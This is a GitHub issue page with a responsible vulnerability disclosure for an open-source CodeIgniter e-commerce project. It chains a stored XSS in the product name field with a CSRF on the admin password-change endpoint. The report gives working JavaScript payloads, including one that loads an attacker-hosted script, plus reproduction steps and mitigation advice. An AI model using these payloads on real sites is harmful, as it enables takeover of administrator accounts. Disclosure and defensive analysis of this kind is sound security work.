
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap%2Fissues%2F264)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap%2Fissues%2F264)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=kirilkirkov%2FEcommerce-CodeIgniter-Bootstrap)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[kirilkirkov](/kirilkirkov)
/
**[Ecommerce-CodeIgniter-Bootstrap](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap)**
Public

* [Notifications](/login?return_to=%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap) You must be signed in to change notification settings
* [Fork
  950](/login?return_to=%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap)
* [Star
   1.3k](/login?return_to=%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap)

* [Code](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap)
* [Issues
  0](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/issues)
* [Pull requests
  0](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/pulls)
* [Actions](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/actions)
* [Projects
  0](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/projects)
* [Wiki](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/wiki)
* [Security](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/security)
* [Insights](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/pulse)

Additional navigation options

* [Code](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap)
* [Issues](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/issues)
* [Pull requests](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/pulls)
* [Actions](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/actions)
* [Projects](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/projects)
* [Wiki](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/wiki)
* [Security](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/security)
* [Insights](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Cross-Site Request Forgery (CSRF) #264

Closed

[3v1lC0d3](/3v1lC0d3) opened this issue
Jul 1, 2024
· 1 comment

Closed

# [Cross-Site Request Forgery (CSRF)](#top) #264

[3v1lC0d3](/3v1lC0d3) opened this issue
Jul 1, 2024
· 1 comment

## Comments

[![@3v1lC0d3](https://avatars.githubusercontent.com/u/50186884?s=80&u=2a97237ced3942b5921054c330c99d192819e716&v=4)](/3v1lC0d3)

Copy link

### **[3v1lC0d3](/3v1lC0d3)** commented [Jul 1, 2024](#issue-2384806542)

| Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.  CVSS3:CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C/CR:M/IR:H/AR:L/MAV:N/MAC:H/MPR:L/MUI:N/MS:U/MC:H/MI:H/MA:L Severity:High - 7.1  Impacts:   1. Unauthorized Actions: Attackers can trick users into performing actions they did not intend to, such as changing account details, making purchases, or transferring funds. 2. Data Integrity Compromise: CSRF can lead to unauthorized changes to user data, affecting the accuracy and reliability of the information stored in the application. 3. Security Breaches: If privileged accounts are targeted, attackers can gain unauthorized access to sensitive data or administrative functionalities. 4. Loss of Trust: Users may lose trust in the security of the web application, leading to reputational damage for the organization. 5. Financial Losses: Both users and organizations can suffer financial losses due to fraudulent transactions or unauthorized actions initiated by attackers.   During the application's inspection, many XSS vulnerabilities were found. Additionally, a Cross-Site Request Forgery (CSRF) was detected and used together to achieve a significant impact on the business. The report of these vulnerabilities is shown below. I started looking for vulnerabilities because, although there is no payment for finding them, I think it is really important to help others enhance their security.  Firstly, an XSS vulnerability was encountered in the product name parameter of the web application, as mentioned in the issue "[#263](https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/issues/263)". In conjunction with a CSRF, it was possible to change the administrator's password just by inserting the following payload.  `<script>var form = document.createElement("form");form.action ="http://localhost/ecomerce/admin/changePass"; form.method = "POST";var input = document.createElement("input");input.type="hidden";input.name ="new_pass"; input.value = "csrf";form.appendChild(input);document.body.appendChild(form);form.submit();</script>`  However, there was a size restriction that made impossible to insert the payload shown above, eventually a way to insert it came to my mind and it's described below.  Proof of Concept: The following payload was used to demonstrate the vulnerability: ` <script src="http://127.0.0.1:8000/test.js"></script> `  Steps to Reproduce: 1.To begin with the explotation,the attacker has to save the file test.js in a remote server with the content show below, this file is gonna be invoke remotly by the xss when the administrator check the products available in the store.  `var form = document.createElement("form");form.action ="http://localhost/ecomerce/admin/changePass"; form.method = "POST";var input = document.createElement("input");input.type="hidden";input.name ="new_pass"; input.value = "csrf";form.appendChild(input);document.body.appendChild(form);form.submit();`   2. In the second place, to test this proof of concept, since this evaluation is being checked on a local environment, I ran a local server with Python where the file "test.js" is stored. This can be completed with the command:    `python -m http.server 8000`    [image](https://private-user-images.githubusercontent.com/50186884/344762211-39efd7ac-12a3-4466-8680-9a3899e6cf2c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTc5MjYsIm5iZiI6MTczNjYxNzYyNiwicGF0aCI6Ii81MDE4Njg4NC8zNDQ3NjIyMTEtMzllZmQ3YWMtMTJhMy00NDY2LTg2ODAtOWEzODk5ZTZjZjJjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3NDcwNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJiY2YxNWZmNzQzNDQ3YmJjZjE1MTExZmVjZjhmZTZlMjJjNmM0YzI0YWI2ZWQ0YjA3MmUyMWRjMmI2OTJjMTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.JapS08KpCiVOTaJ0LakdjD-iNcx3J7ySjfJ_7xnZffE) 3. To continue this proof, it is required to save a product in the product name parameter with the following payload. This means that the remote file test.js is going to be invoked when the administrator checks the available products.   `<script src="http://127.0.0.1:8000/test.js"></script>` [image](https://private-user-images.githubusercontent.com/50186884/344762336-9b653936-944d-4140-a844-949fb00367af.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTc5MjYsIm5iZiI6MTczNjYxNzYyNiwicGF0aCI6Ii81MDE4Njg4NC8zNDQ3NjIzMzYtOWI2NTM5MzYtOTQ0ZC00MTQwLWE4NDQtOTQ5ZmIwMDM2N2FmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3NDcwNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTZjNTgzY2RlMzY1OGI5Y2U3Y2Y0Mjg0NDJiYjM5M2VkMjk4ZWZjM2JhYmQyMjlhM2Q4NDdkZWMwYzY5ZmQ5YTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.HoAx2SLd8jU_yQfHlXZCS41dbS4yxo3O_OuXB3V4tik)  4.To verify that the payload was successfully crafted, it is necessary to simulate an administrator login. To replicate the normal behavior, it is necessary to go to the product section and review the available items. Then a number 1 is shown this indicated that the changing of password correct done. [image](https://private-user-images.githubusercontent.com/50186884/344762464-ee28d6df-0f62-4194-a08c-f4a3e100d603.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTc5MjYsIm5iZiI6MTczNjYxNzYyNiwicGF0aCI6Ii81MDE4Njg4NC8zNDQ3NjI0NjQtZWUyOGQ2ZGYtMGY2Mi00MTk0LWEwOGMtZjRhM2UxMDBkNjAzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3NDcwNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgxOWFhZDNmZThlNTFlMzBiZjEzMjZhN2YxYzc0MjZhOWNlNzI4MzViYTdhYTg2ZTNkNDAxZmZiNTJmMTllNGQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.tHLCOOU9RwAnHIN5fyAVfg293OQHpLQf94Aq24C19qI)   5. To verify if the passwird was correctly configured it has to try a login with the nu password "**csfr**".    [image](https://private-user-images.githubusercontent.com/50186884/344762547-1d18f4e4-5041-494d-a36e-473cc0688d72.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTc5MjYsIm5iZiI6MTczNjYxNzYyNiwicGF0aCI6Ii81MDE4Njg4NC8zNDQ3NjI1NDctMWQxOGY0ZTQtNTA0MS00OTRkLWEzNmUtNDczY2MwNjg4ZDcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3NDcwNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkzMGIzNTg5NjQwNDEzMGY1ZWNlNDg1N2IwZmNjYzkwY2VkODY0NGVlN2QwODRkM2E4ZjI3OWRiZTMyOTQ5YjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.MiHa_SxJDZUdm8zYEtDrWtc0kH4ZlMrt704M1P6nsN4)    In the following picture the administrator shows up indicating that the pasword was changed by correctly by "**csrf**"    [image](https://private-user-images.githubusercontent.com/50186884/344762827-fb4ab271-97e8-41f4-a1d0-be806de86b7a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTc5MjYsIm5iZiI6MTczNjYxNzYyNiwicGF0aCI6Ii81MDE4Njg4NC8zNDQ3NjI4MjctZmI0YWIyNzEtOTdlOC00MWY0LWExZDAtYmU4MDZkZTg2YjdhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3NDcwNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUzZTRjNWZhMzI5ZDQ0MzNlY2M4YWM5MGI1MjEwMDMxMjFlZGUwNzYyYmU3NjA4NzBlY2E4NTE3ZWY0Zjk5MDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.M0pvzd6oZ9OgNXipfrlJJcWKETCFkR7CgNb6sD6L9_w)  Recommendations  1. **Use Anti-CSRF Tokens**     * Generate a unique CSRF token for each user session.    * Include this token in all forms and state-changing requests (e.g., POST, PUT, DELETE).    * Validate the token server-side to ensure it matches the user's session token. 2. **SameSite Cookies**     * Set the `SameSite` attribute for cookies to `Strict` or `Lax`. This helps prevent cookies from being sent along with cross-site requests.    * Example: `Set-Cookie: sessionId=abc123; SameSite=Strict` 3. **Custom Headers**     * Use custom headers for AJAX requests (e.g., `X-Requested-With: XMLHttpRequest`). CSRF attacks typically can't set custom headers. 4. **Double Submit Cookies**     * Send a CSRF token as both a cookie and a request parameter. Validate that both values match on the server side. 5. **Check Referrer and Origin Headers**     * Validate the `Referer` and `Origin` headers to ensure requests are coming from trusted sources. However, these headers can sometimes be absent or modified. 6. **User Interaction Validation**     * Require user interaction for sensitive actions (e.g., entering a password before changing account settings). 7. **Rate Limiting**     * Implement rate limiting to reduce the impact of automated CSRF attacks. 8. **Content Security Policy (CSP)**     * Use CSP to restrict the origins from which content can be loaded, reducing the risk of malicious scripts. 9. **Framework and Library Features**     * Use built-in CSRF protection features provided by web frameworks and libraries (e.g., Django, Ruby on Rails, ASP.NET). 10. **Regular Security Audits**      * Regularly audit your codebase and dependencies for vulnerabilities and ensure all security patches are applied.  References <https://owasp.org/www-community/attacks/csrf> |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@kirilkirkov](https://avatars.githubusercontent.com/u/3421328?s=80&u=391da5aba6747ffb258582f234d0917b98e3e9d7&v=4)](/kirilkirkov)

Copy link

Owner

### **[kirilkirkov](/kirilkirkov)** commented [Jul 3, 2024](#issuecomment-2206932294)

| Hello [@3v1lC0d3](https://github.com/3v1lC0d3) since i don't have free time and the project is open source, feel free to make a pull request with CSRF implementation and i will merge it. |
| --- |

All reactions

Sorry, something went wrong.

[![@kirilkirkov](https://avatars.githubusercontent.com/u/3421328?s=40&u=391da5aba6747ffb258582f234d0917b98e3e9d7&v=4)](/kirilkirkov)
[kirilkirkov](/kirilkirkov)
closed this as [not planned](/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3A%22not+planned%22)
Won't fix, can't repro, duplicate, stale
[Jul 3, 2024](#event-13384414714)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fkirilkirkov%2FEcommerce-CodeIgniter-Bootstrap%2Fissues%2F264)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@kirilkirkov](https://avatars.githubusercontent.com/u/3421328?s=52&v=4)](/kirilkirkov) [![@3v1lC0d3](https://avatars.githubusercontent.com/u/50186884?s=52&v=4)](/3v1lC0d3)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

